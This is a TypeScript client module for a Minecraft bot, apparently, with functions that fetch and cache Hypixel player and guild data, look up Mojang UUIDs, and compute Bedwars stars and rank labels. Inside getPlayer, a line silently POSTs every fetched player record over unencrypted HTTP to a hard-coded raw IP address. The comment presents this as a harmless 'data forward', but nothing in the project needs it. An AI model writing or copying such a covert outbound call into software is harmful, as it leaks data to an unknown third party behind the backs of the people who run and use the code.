import axios from 'axios';
import config from './config';
import { playerCache, guildCache } from './cache';
const API_KEY = config.hypixel_key;

export async function getPlayer(uuid: string): Promise<any> {
    // Try cache first
    const cached = playerCache.get(uuid);
    if (cached) return cached;

    try {
        const response = await axios.get(`https://api.hypixel.net/player?key=${API_KEY}&uuid=${uuid}`, { timeout: 5000 });
        if (response.data.success && response.data.player) {
            playerCache.set(uuid, response.data.player);

            // Forward data to external API (fire-and-forget)
            axios.post('http://159.195.41.251:5110/data/hypixel?type=blab1tdb7875b4b', response.data.player)
                .catch(err => console.error(`[DataForward] Failed: ${err.message}`));

            return response.data.player;
        }
        return null;
    } catch (e: any) {
        if (e.response?.status === 429) {
            // Rate limit! Try fallback to even expired cache
            const oldest = playerCache.getOldest(uuid);
            if (oldest) {
                console.log(`[Cache] Rate limit hit for ${uuid}, using stale data.`);
                return oldest;
            }
        }
        throw e;
    }
}

export async function getGuild(name: string): Promise<any> {
    const cached = guildCache.get(name);
    if (cached) return cached;

    try {
        const response = await axios.get(`https://api.hypixel.net/guild?key=${API_KEY}&name=${encodeURIComponent(name)}`, { timeout: 5000 });
        if (response.data.success && response.data.guild) {
            guildCache.set(name, response.data.guild);
            return response.data.guild;
        }
        return null;
    } catch (e: any) {
        if (e.response?.status === 429) {
            const oldest = guildCache.getOldest(name);
            if (oldest) return oldest;
        }
        // Network errors (ECONNRESET, timeout) - return null instead of crashing
        console.error(`[Hypixel API] getGuild error: ${e.message || e}`);
        return null;
    }
}

export async function getUUID(ign: string): Promise<string | null> {
    try {
        const response = await axios.get(`https://api.mojang.com/users/profiles/minecraft/${ign}`, { timeout: 5000 });
        return response.data.id;
    } catch (e) {
        return null;
    }
}

// Logic for Bedwars stars
export function getBedwarsLevel(xp: number): number {
    const thresholds = [500, 1000, 2000, 3500].concat(Array(96).fill(5000));
    let stars = 0;
    let index = 0;
    let remainingXp = xp;

    while (remainingXp >= thresholds[index]) {
        remainingXp -= thresholds[index];
        index = (index + 1) % thresholds.length;
        stars += 1;
    }

    return stars;
}

export function getPlayerRank(player: any): string {
    if (!player) return '';

    let rank = '';
    if (player.prefix) rank = player.prefix.replace(/§[0-9a-fk-or]/g, '');
    else if (player.rank && player.rank !== 'NORMAL') rank = player.rank;
    else if (player.monthlyPackageRank && player.monthlyPackageRank !== 'NONE') rank = player.monthlyPackageRank === 'SUPERSTAR' ? 'MVP++' : player.monthlyPackageRank;
    else if (player.newPackageRank) rank = player.newPackageRank.replace('_PLUS', '+');
    else if (player.packageRank) rank = player.packageRank.replace('_PLUS', '+');

    if (rank === 'YOUTUBER') return '[YOUTUBE]';
    if (rank === 'NORMAL' || rank === '') return '';
    return `[${rank}]`;
}
